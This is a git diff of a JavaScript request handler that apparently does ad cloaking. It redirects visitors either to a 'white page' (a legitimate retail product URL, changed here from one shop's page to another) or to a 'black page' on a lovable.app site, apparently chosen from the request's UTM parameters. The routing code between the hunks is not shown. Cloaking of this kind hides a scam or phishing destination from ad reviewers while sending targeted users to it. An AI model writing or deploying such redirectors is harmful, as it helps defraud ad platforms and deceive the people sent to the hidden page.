@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.bonds.com.au/newbies-wide-needle-rib-zippy-bwcua-yl0.html?queryID=a987e3d0ca26f070e43c50c7b8c7186f&objectID=624672&indexName=prod_bonds_m2_bonds_products";
+    const whitePageURL = "https://www.bethanylinz.com/products/paradise-large-tote-bag";
     const blackPageURL = "https://luvcshap.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
